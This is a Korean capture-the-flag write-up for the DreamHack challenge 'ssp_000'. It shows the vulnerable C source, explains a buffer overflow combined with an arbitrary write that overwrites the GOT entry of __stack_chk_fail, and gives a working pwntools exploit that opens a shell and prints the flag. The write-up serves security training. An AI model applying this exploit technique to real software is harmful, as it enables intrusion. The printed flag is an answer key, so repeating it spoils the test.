# [DreamHack] ssp_000

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 작동하고 있는 서비스(ssp_000)의 바이너리와 소스코드가 주어집니다.
> 프로그램의 취약점을 찾고 SSP 방어 기법을 우회하여 익스플로잇해 셸을 획득한 후, “flag” 파일을 읽으세요.
> “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [ssp_000.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8558178/ssp_000.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/159595089-6bb317a4-c659-4f79-bfbc-36c716acfa99.png)

## Analysis

```c
void get_shell() {
    system("/bin/sh");
}

int main(int argc, char *argv[]) {
    long addr;
    long value;
    char buf[0x40] = {};

    initialize();


    read(0, buf, 0x80);

    printf("Addr : ");
    scanf("%ld", &addr);
    printf("Value : ");
    scanf("%ld", &value);

    *(long *)addr = value;

    return 0;
}
```

`read(0, buf, 0x80)`에서 BOF가 발생한다. 여기서 canary를 임의로 변조시킬 수 있다.

그 다음에는 `addr`과 `value`를 입력하여 원하는 주소에 원하는 값을 쓸 수 있다. canary 변조가 감지되면 `__stack_chk_fail()`이 호출되므로, 이 함수의 GOT를 `get_shell()`의 주소로 덮으면 셸을 획득할 수 있다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/ssp_000')
else:
    r = remote('host2.dreamhack.games', 19808)

__stack_chk_fail_got = 0x601020 # GOT of __stack_chk_fail()
get_shell = 0x4008ea # get_shell()

# corrupt canary
r.send('a' * 0x50)

# overwrite GOT of __stack_chk_fail() with get_shell()
r.sendlineafter('Addr : ', str(__stack_chk_fail_got))
r.sendlineafter('Value : ', str(get_shell))

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host2.dreamhack.games on port 19808: Done
[*] Switching to interactive mode
$ cat flag
DH{e4d253b82911565ad8dd9625fb491ab0}
```